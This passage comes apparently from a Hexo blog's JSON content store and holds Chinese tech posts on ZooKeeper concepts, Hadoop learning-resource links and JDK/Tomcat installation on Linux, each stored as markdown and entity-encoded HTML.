href=\"#&#x8BBE;&#x8BA1;&#x76EE;&#x7684;\" class=\"headerlink\" title=\"&#x8BBE;&#x8BA1;&#x76EE;&#x7684;\"></a>&#x8BBE;&#x8BA1;&#x76EE;&#x7684;</h3><ul>\n<li>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#xFF1A;client&#x4E0D;&#x8BBA;&#x8FDE;&#x63A5;&#x5230;&#x54EA;&#x4E2A;Server&#xFF0C;&#x5C55;&#x793A;&#x7ED9;&#x5B83;&#x90FD;&#x662F;&#x540C;&#x4E00;&#x4E2A;&#x89C6;&#x56FE;&#xFF0C;&#x8FD9;&#x662F;zookeeper&#x6700;&#x91CD;&#x8981;&#x7684;&#x6027;&#x80FD;&#x3002;</li>\n<li>&#x53EF;&#x9760;&#x6027;&#xFF1A;&#x5177;&#x6709;&#x7B80;&#x5355;&#x3001;&#x5065;&#x58EE;&#x3001;&#x826F;&#x597D;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x5982;&#x679C;&#x6D88;&#x606F;m&#x88AB;&#x5230;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x5C06;&#x88AB;&#x6240;&#x6709;&#x7684;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7;&#x3002;</li>\n<li>&#x5B9E;&#x65F6;&#x6027;&#xFF1A;Zookeeper&#x4FDD;&#x8BC1;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x5728;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x8303;&#x56F4;&#x5185;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x5668;&#x7684;&#x66F4;&#x65B0;&#x4FE1;&#x606F;&#xFF0C;&#x6216;&#x8005;&#x670D;&#x52A1;&#x5668;&#x5931;&#x6548;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x4F46;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x5EF6;&#x65F6;&#x7B49;&#x539F;&#x56E0;&#xFF0C;Zookeeper&#x4E0D;&#x80FD;&#x4FDD;&#x8BC1;&#x4E24;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x540C;&#x65F6;&#x5F97;&#x5230;&#x521A;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x6700;&#x65B0;&#x6570;&#x636E;&#xFF0C;&#x5E94;&#x8BE5;&#x5728;&#x8BFB;&#x6570;&#x636E;&#x4E4B;&#x524D;&#x8C03;&#x7528;sync()&#x63A5;&#x53E3;&#x3002;</li>\n<li>&#x7B49;&#x5F85;&#x65E0;&#x5173;&#xFF08;wait-free&#xFF09;&#xFF1A;&#x6162;&#x7684;&#x6216;&#x8005;&#x5931;&#x6548;&#x7684;client&#x4E0D;&#x5F97;&#x5E72;&#x9884;&#x5FEB;&#x901F;&#x7684;client&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x4F7F;&#x5F97;&#x6BCF;&#x4E2A;client&#x90FD;&#x80FD;&#x6709;&#x6548;&#x7684;&#x7B49;&#x5F85;&#x3002;</li>\n<li>&#x539F;&#x5B50;&#x6027;&#xFF1A;&#x66F4;&#x65B0;&#x53EA;&#x80FD;&#x6210;&#x529F;&#x6216;&#x8005;&#x5931;&#x8D25;&#xFF0C;&#x6CA1;&#x6709;&#x4E2D;&#x95F4;&#x72B6;&#x6001;&#x3002;</li>\n<li>&#x987A;&#x5E8F;&#x6027;&#xFF1A;&#x5305;&#x62EC;&#x5168;&#x5C40;&#x6709;&#x5E8F;&#x548C;&#x504F;&#x5E8F;&#x4E24;&#x79CD;&#xFF1A;&#x5168;&#x5C40;&#x6709;&#x5E8F;&#x662F;&#x6307;&#x5982;&#x679C;&#x5728;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6D88;&#x606F;a&#x5728;&#x6D88;&#x606F;b&#x524D;&#x53D1;&#x5E03;&#xFF0C;&#x5219;&#x5728;&#x6240;&#x6709;Server&#x4E0A;&#x6D88;&#x606F;a&#x90FD;&#x5C06;&#x5728;&#x6D88;&#x606F;b&#x524D;&#x88AB;&#x53D1;&#x5E03;&#xFF1B;&#x504F;&#x5E8F;&#x662F;&#x6307;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6D88;&#x606F;b&#x5728;&#x6D88;&#x606F;a&#x540E;&#x88AB;&#x540C;&#x4E00;&#x4E2A;&#x53D1;&#x9001;&#x8005;&#x53D1;&#x5E03;&#xFF0C;a&#x5FC5;&#x5C06;&#x6392;&#x5728;b&#x524D;&#x9762;&#x3002;</li>\n</ul>\n<h3 id=\"&#x5355;&#x673A;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\"><a href=\"#&#x5355;&#x673A;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"&#x5355;&#x673A;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\"></a>&#x5355;&#x673A;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;</h3><p>1&#x3001;&#x89E3;&#x538B;&#xFF1A;tar xzf zookeeper-3.4.5.tar.gz<br>2&#x3001;&#x5728;conf&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;zoo.cfg&#xFF0C;dataDir=/usr/local/zk/data<br>3&#x3001;&#x542F;&#x52A8;ZooKeeper&#x7684;Server&#xFF1A;sh bin/zkServer.sh start, &#x5982;&#x679C;&#x60F3;&#x8981;&#x5173;&#x95ED;&#xFF0C;&#x8F93;&#x5165;&#xFF1A;zkServer.sh stop</p>\n<h3 id=\"&#x96C6;&#x7FA4;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\"><a href=\"#&#x96C6;&#x7FA4;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"&#x96C6;&#x7FA4;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\"></a>&#x96C6;&#x7FA4;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;</h3><p>1&#x3001;&#x521B;&#x5EFA;myid&#x6587;&#x4EF6;&#xFF0C;server1&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;1&#xFF0C;server2&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;2&#xFF0C;server3&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;3<br>2&#x3001;&#x5728;conf&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;zoo.cfg&#xFF0C;<br>dataDir=/usr/local/zk/data<br>server.1=server1:2888:3888<br>server.2=server2:2888:3888<br>server.3=server3:2888:3888</p>\n<h3 id=\"Zookeeper&#x7684;&#x6570;&#x636E;&#x6A21;&#x578B;\"><a href=\"#Zookeeper&#x7684;&#x6570;&#x636E;&#x6A21;&#x578B;\" class=\"headerlink\" title=\"Zookeeper&#x7684;&#x6570;&#x636E;&#x6A21;&#x578B;\"></a>Zookeeper&#x7684;&#x6570;&#x636E;&#x6A21;&#x578B;</h3><ul>\n<li>&#x5C42;&#x6B21;&#x5316;&#x7684;&#x76EE;&#x5F55;&#x7ED3;&#x6784;&#xFF0C;&#x547D;&#x540D;&#x7B26;&#x5408;&#x5E38;&#x89C4;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x89C4;&#x8303;</li>\n<li>&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x5728;zookeeper&#x4E2D;&#x53EB;&#x505A;znode,&#x5E76;&#x4E14;&#x5176;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;&#x8DEF;&#x5F84;&#x6807;&#x8BC6;</li>\n<li>&#x8282;&#x70B9;Znode&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x6570;&#x636E;&#x548C;&#x5B50;&#x8282;&#x70B9;&#xFF0C;&#x4F46;&#x662F;EPHEMERAL&#x7C7B;&#x578B;&#x7684;&#x8282;&#x70B9;&#x4E0D;&#x80FD;&#x6709;&#x5B50;&#x8282;&#x70B9;</li>\n<li>Znode&#x4E2D;&#x7684;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982;&#x67D0;&#x4E00;&#x4E2A;&#x8DEF;&#x5F84;&#x4E0B;&#x5B58;&#x6709;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x7248;&#x672C;&#xFF0C;&#x90A3;&#x4E48;&#x67E5;&#x8BE2;&#x8FD9;&#x4E2A;&#x8DEF;&#x5F84;&#x4E0B;&#x7684;&#x6570;&#x636E;&#x5C31;&#x9700;&#x8981;&#x5E26;&#x4E0A;&#x7248;&#x672C;</li>\n<li>&#x5BA2;&#x6237;&#x7AEF;&#x5E94;&#x7528;&#x53EF;&#x4EE5;&#x5728;&#x8282;&#x70B9;&#x4E0A;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#x5668;</li>\n<li>&#x8282;&#x70B9;&#x4E0D;&#x652F;&#x6301;&#x90E8;&#x5206;&#x8BFB;&#x5199;&#xFF0C;&#x800C;&#x662F;&#x4E00;&#x6B21;&#x6027;&#x5B8C;&#x6574;&#x8BFB;&#x5199;</li>\n</ul>"},{"title":"hadoop学习资料","date":"2016-05-16T13:18:00.000Z","toc":false,"_content":"\n去年有段学习大数据的经历。学习初衷是因为当时在“架构师”等微信公众号上看文章，总涉及到一些大数据的专业词汇，由于不懂意思，看文章似懂非懂，所以利用业余时间进行了相关学习与部署。\n\n**当时收集了一些教学视频与网站，绝对干货，现分享如下：**\n\n- 大数据学习论坛：[http://www.aboutyun.com/](http://www.aboutyun.com/)\n- 吴超hadoop视频教程全套：[http://pan.baidu.com/s/1kUQP3cN](http://pan.baidu.com/s/1kUQP3cN) 提取密码：a49u\n- 炼数成金hadoop视频：[http://pan.baidu.com/s/1i5Es83V](http://pan.baidu.com/s/1i5Es83V) 提取密码：vnw7\n- Hadoop集群资料集锦：[http://pan.baidu.com/s/1c1AOI4K](http://pan.baidu.com/s/1c1AOI4K) 提取密码：ufgs\n","source":"_posts/hadoop学习资料.md","raw":"---\ntitle: hadoop学习资料\ncategories:\n  - 其他技术\ntags:\n  - hadoop\ndate: 2016-5-16 21:18:00\ntoc: false\n\n---\n\n去年有段学习大数据的经历。学习初衷是因为当时在“架构师”等微信公众号上看文章，总涉及到一些大数据的专业词汇，由于不懂意思，看文章似懂非懂，所以利用业余时间进行了相关学习与部署。\n\n**当时收集了一些教学视频与网站，绝对干货，现分享如下：**\n\n- 大数据学习论坛：[http://www.aboutyun.com/](http://www.aboutyun.com/)\n- 吴超hadoop视频教程全套：[http://pan.baidu.com/s/1kUQP3cN](http://pan.baidu.com/s/1kUQP3cN) 提取密码：a49u\n- 炼数成金hadoop视频：[http://pan.baidu.com/s/1i5Es83V](http://pan.baidu.com/s/1i5Es83V) 提取密码：vnw7\n- Hadoop集群资料集锦：[http://pan.baidu.com/s/1c1AOI4K](http://pan.baidu.com/s/1c1AOI4K) 提取密码：ufgs\n","slug":"hadoop学习资料","published":1,"updated":"2016-11-17T11:59:42.673Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulcw0032gwtmx3unfhm1","content":"<p>&#x53BB;&#x5E74;&#x6709;&#x6BB5;&#x5B66;&#x4E60;&#x5927;&#x6570;&#x636E;&#x7684;&#x7ECF;&#x5386;&#x3002;&#x5B66;&#x4E60;&#x521D;&#x8877;&#x662F;&#x56E0;&#x4E3A;&#x5F53;&#x65F6;&#x5728;&#x201C;&#x67B6;&#x6784;&#x5E08;&#x201D;&#x7B49;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x4E0A;&#x770B;&#x6587;&#x7AE0;&#xFF0C;&#x603B;&#x6D89;&#x53CA;&#x5230;&#x4E00;&#x4E9B;&#x5927;&#x6570;&#x636E;&#x7684;&#x4E13;&#x4E1A;&#x8BCD;&#x6C47;&#xFF0C;&#x7531;&#x4E8E;&#x4E0D;&#x61C2;&#x610F;&#x601D;&#xFF0C;&#x770B;&#x6587;&#x7AE0;&#x4F3C;&#x61C2;&#x975E;&#x61C2;&#xFF0C;&#x6240;&#x4EE5;&#x5229;&#x7528;&#x4E1A;&#x4F59;&#x65F6;&#x95F4;&#x8FDB;&#x884C;&#x4E86;&#x76F8;&#x5173;&#x5B66;&#x4E60;&#x4E0E;&#x90E8;&#x7F72;&#x3002;</p>\n<p><strong>&#x5F53;&#x65F6;&#x6536;&#x96C6;&#x4E86;&#x4E00;&#x4E9B;&#x6559;&#x5B66;&#x89C6;&#x9891;&#x4E0E;&#x7F51;&#x7AD9;&#xFF0C;&#x7EDD;&#x5BF9;&#x5E72;&#x8D27;&#xFF0C;&#x73B0;&#x5206;&#x4EAB;&#x5982;&#x4E0B;&#xFF1A;</strong></p>\n<ul>\n<li>&#x5927;&#x6570;&#x636E;&#x5B66;&#x4E60;&#x8BBA;&#x575B;&#xFF1A;<a href=\"http://www.aboutyun.com/\" target=\"_blank\" rel=\"external\">http://www.aboutyun.com/</a></li>\n<li>&#x5434;&#x8D85;hadoop&#x89C6;&#x9891;&#x6559;&#x7A0B;&#x5168;&#x5957;&#xFF1A;<a href=\"http://pan.baidu.com/s/1kUQP3cN\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/s/1kUQP3cN</a> &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;a49u</li>\n<li>&#x70BC;&#x6570;&#x6210;&#x91D1;hadoop&#x89C6;&#x9891;&#xFF1A;<a href=\"http://pan.baidu.com/s/1i5Es83V\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/s/1i5Es83V</a> &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;vnw7</li>\n<li>Hadoop&#x96C6;&#x7FA4;&#x8D44;&#x6599;&#x96C6;&#x9526;&#xFF1A;<a href=\"http://pan.baidu.com/s/1c1AOI4K\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/s/1c1AOI4K</a> &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;ufgs</li>\n</ul>\n","excerpt":"","more":"<p>&#x53BB;&#x5E74;&#x6709;&#x6BB5;&#x5B66;&#x4E60;&#x5927;&#x6570;&#x636E;&#x7684;&#x7ECF;&#x5386;&#x3002;&#x5B66;&#x4E60;&#x521D;&#x8877;&#x662F;&#x56E0;&#x4E3A;&#x5F53;&#x65F6;&#x5728;&#x201C;&#x67B6;&#x6784;&#x5E08;&#x201D;&#x7B49;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x4E0A;&#x770B;&#x6587;&#x7AE0;&#xFF0C;&#x603B;&#x6D89;&#x53CA;&#x5230;&#x4E00;&#x4E9B;&#x5927;&#x6570;&#x636E;&#x7684;&#x4E13;&#x4E1A;&#x8BCD;&#x6C47;&#xFF0C;&#x7531;&#x4E8E;&#x4E0D;&#x61C2;&#x610F;&#x601D;&#xFF0C;&#x770B;&#x6587;&#x7AE0;&#x4F3C;&#x61C2;&#x975E;&#x61C2;&#xFF0C;&#x6240;&#x4EE5;&#x5229;&#x7528;&#x4E1A;&#x4F59;&#x65F6;&#x95F4;&#x8FDB;&#x884C;&#x4E86;&#x76F8;&#x5173;&#x5B66;&#x4E60;&#x4E0E;&#x90E8;&#x7F72;&#x3002;</p>\n<p><strong>&#x5F53;&#x65F6;&#x6536;&#x96C6;&#x4E86;&#x4E00;&#x4E9B;&#x6559;&#x5B66;&#x89C6;&#x9891;&#x4E0E;&#x7F51;&#x7AD9;&#xFF0C;&#x7EDD;&#x5BF9;&#x5E72;&#x8D27;&#xFF0C;&#x73B0;&#x5206;&#x4EAB;&#x5982;&#x4E0B;&#xFF1A;</strong></p>\n<ul>\n<li>&#x5927;&#x6570;&#x636E;&#x5B66;&#x4E60;&#x8BBA;&#x575B;&#xFF1A;<a href=\"http://www.aboutyun.com/\">http://www.aboutyun.com/</a></li>\n<li>&#x5434;&#x8D85;hadoop&#x89C6;&#x9891;&#x6559;&#x7A0B;&#x5168;&#x5957;&#xFF1A;<a href=\"http://pan.baidu.com/s/1kUQP3cN\">http://pan.baidu.com/s/1kUQP3cN</a> &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;a49u</li>\n<li>&#x70BC;&#x6570;&#x6210;&#x91D1;hadoop&#x89C6;&#x9891;&#xFF1A;<a href=\"http://pan.baidu.com/s/1i5Es83V\">http://pan.baidu.com/s/1i5Es83V</a> &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;vnw7</li>\n<li>Hadoop&#x96C6;&#x7FA4;&#x8D44;&#x6599;&#x96C6;&#x9526;&#xFF1A;<a href=\"http://pan.baidu.com/s/1c1AOI4K\">http://pan.baidu.com/s/1c1AOI4K</a> &#x63D0;&#x53D6;&#x5BC6;&#x7801;&#xFF1A;ufgs</li>\n</ul>\n"},{"title":"linux中搭建java开发环境","date":"2016-05-29T14:10:00.000Z","_content":"\n### JDK安装\n登录网址：http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\n下载对应jdk版本，比如 jdk-7u80-linux-x64.tar.gz。\n\n```bash\n# 执行下面命令安装JDK\nmkdir -p /opt/java\ntar -xvf jdk-7u80-linux-x64.tar.gz -C /opt/java\n\n# 创建一个链接\nln -s /opt/java/jdk1.7.0_80 /opt/java/jdk \n\n# 设置环境变量\nvi /etc/frofile   \n\nexport JAVA_HOME=/opt/java/jdk\nexprot PATH=$JAVA_HOME/bin:$PATH\nexport CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\n\n# 使配置文件生效\nsource /etc/profile\n```\n\n执行java -version命令，测试一下是否安装成功。\n\n---\n\n### Tomcat安装\n```bash\n# 解压\nmkdir -p /opt/tomcat\ntar -xvf apache-tomcat-6.0.10.tar.gz -C /opt/tomcat/\n\n# 创建一个链接\nln -s /opt/tomcat/apache-tomcat-6.0.10 /opt/tomcat/tomcat6.0\n\ncd /opt/tomcat/tomcat6.0/bin\n\n./startup.sh\n```\n再打开浏览器测试一下，输入http:localhost:8080，猫的页面出来，说明安装成功了。\n","source":"_posts/linux中搭建java开发环境.md","raw":"---\ntitle: linux中搭建java开发环境\ncategories:\n  - 运维部署\ntags:\n  - jdk\ndate: 2016-5-29 22:10:00\n\n---\n\n### JDK安装\n登录网址：http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\n下载对应jdk版本，比如 jdk-7u80-linux-x64.tar.gz。\n\n```bash\n# 执行下面命令安装JDK\nmkdir -p /opt/java\ntar -xvf jdk-7u80-linux-x64.tar.gz -C /opt/java\n\n# 创建一个链接\nln -s /opt/java/jdk1.7.0_80 /opt/java/jdk \n\n# 设置环境变量\nvi /etc/frofile   \n\nexport JAVA_HOME=/opt/java/jdk\nexprot PATH=$JAVA_HOME/bin:$PATH\nexport CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\n\n# 使配置文件生效\nsource /etc/profile\n```\n\n执行java -version命令，测试一下是否安装成功。\n\n---\n\n### Tomcat安装\n```bash\n# 解压\nmkdir -p /opt/tomcat\ntar -xvf apache-tomcat-6.0.10.tar.gz -C /opt/tomcat/\n\n# 创建一个链接\nln -s /opt/tomcat/apache-tomcat-6.0.10 /opt/tomcat/tomcat6.0\n\ncd /opt/tomcat/tomcat6.0/bin\n\n./startup.sh\n```\n再打开浏览器测试一下，输入http:localhost:8080，猫的页面出来，说明安装成功了。\n","slug":"linux中搭建java开发环境","published":1,"updated":"2016-11-19T01:46:24.781Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulcy0035gwtmt1e06oot","content":"<h3 id=\"JDK&#x5B89;&#x88C5;\"><a href=\"#JDK&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"JDK&#x5B89;&#x88C5;\"></a>JDK&#x5B89;&#x88C5;</h3><p>&#x767B;&#x5F55;&#x7F51;&#x5740;&#xFF1A;<a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\" target=\"_blank\" rel=\"external\">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a><br>&#x4E0B;&#x8F7D;&#x5BF9;&#x5E94;jdk&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982; jdk-7u80-linux-x64.tar.gz&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x6267;&#x884C;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x5B89;&#x88C5;JDK</span></span><br><span class=\"line\">mkdir -p /opt/java</span><br><span class=\"line\">tar -xvf jdk-7u80-linux-x64.tar.gz -C /opt/java</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x94FE;&#x63A5;</span></span><br><span class=\"line\">ln <span class=\"_\">-s</span> /opt/java/jdk1.7.0_80 /opt/java/jdk </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;</span></span><br><span class=\"line\">vi /etc/frofile   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">export</span> JAVA_HOME=/opt/java/jdk</span><br><span class=\"line\">exprot PATH=<span class=\"variable\">$JAVA_HOME</span>/bin:<span class=\"variable\">$PATH</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> CLASSPATH=.:<span class=\"variable\">$JAVA_HOME</span>/jre/lib/rt.jar:<span class=\"variable\">$JAVA_HOME</span>/lib/dt.jar:<span class=\"variable\">$JAVA_HOME</span>/lib/tools.jar</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4F7F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x751F;&#x6548;</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> /etc/profile</span><br></pre></td></tr></table></figure>\n<p>&#x6267;&#x884C;java -version&#x547D;&#x4EE4;&#xFF0C;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x3002;</p>\n<hr>\n<h3 id=\"Tomcat&#x5B89;&#x88C5;\"><a href=\"#Tomcat&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"Tomcat&#x5B89;&#x88C5;\"></a>Tomcat&#x5B89;&#x88C5;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x89E3;&#x538B;</span></span><br><span class=\"line\">mkdir -p /opt/tomcat</span><br><span class=\"line\">tar -xvf apache-tomcat-6.0.10.tar.gz -C /opt/tomcat/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x94FE;&#x63A5;</span></span><br><span class=\"line\">ln <span class=\"_\">-s</span> /opt/tomcat/apache-tomcat-6.0.10 /opt/tomcat/tomcat6.0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /opt/tomcat/tomcat6.0/bin</span><br><span class=\"line\"></span><br><span class=\"line\">./startup.sh</span><br></pre></td></tr></table></figure>\n<p>&#x518D;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;http:localhost:8080&#xFF0C;&#x732B;&#x7684;&#x9875;&#x9762;&#x51FA;&#x6765;&#xFF0C;&#x8BF4;&#x660E;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x4E86;&#x3002;</p>\n","excerpt":"","more":"<h3 id=\"JDK&#x5B89;&#x88C5;\"><a href=\"#JDK&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"JDK&#x5B89;&#x88C5;\"></a>JDK&#x5B89;&#x88C5;</h3><p>&#x767B;&#x5F55;&#x7F51;&#x5740;&#xFF1A;<a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a><br>&#x4E0B;&#x8F7D;&#x5BF9;&#x5E94;jdk&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982; jdk-7u80-linux-x64.tar.gz&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x6267;&#x884C;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x5B89;&#x88C5;JDK</span></span><br><span class=\"line\">mkdir -p /opt/java</span><br><span class=\"line\">tar -xvf jdk-7u80-linux-x64.tar.gz -C /opt/java</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x94FE;&#x63A5;</span></span><br><span class=\"line\">ln <span class=\"_\">-s</span> /opt/java/jdk1.7.0_80 /opt/java/jdk </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;</span></span><br><span class=\"line\">vi /etc/frofile   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">export</span> JAVA_HOME=/opt/java/jdk</span><br><span class=\"line\">exprot PATH=<span class=\"variable\">$JAVA_HOME</span>/bin:<span class=\"variable\">$PATH</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> CLASSPATH=.:<span class=\"variable\">$JAVA_HOME</span>/jre/lib/rt.jar:<span class=\"variable\">$JAVA_HOME</span>/lib/dt.jar:<span class=\"variable\">$JAVA_HOME</span>/lib/tools.jar</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4F7F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x751F;&#x6548;</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> /etc/profile</span><br></pre></td></tr></table></figure>\n<p>&#x6267;&#x884C;java -version&#x547D;&#x4EE4;&#xFF0C;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x3002;</p>\n<hr>\n<h3 id=\"Tomcat&#x5B89;&#x88C5;\"><a href=\"#Tomcat&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"Tomcat&#x5B89;&#x88C5;\"></a>Tomcat&#x5B89;&#x88C5;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x89E3;&#x538B;</span></span><br><span class=\"line\">mkdir -p /opt/tomcat</span><br><span class=\"line\">tar -xvf apache-tomcat-6.0.10.tar.gz -C /opt/tomcat/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x94FE;&#x63A5;</span></span><br><span class=\"line\">ln <span class=\"_\">-s</span> /opt/tomcat/apache-tomcat-6.0.10 /opt/tomcat/tomcat6.0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /opt/tomcat/tomcat6.0/bin</span><br><span class=\"line\"></span><br><span 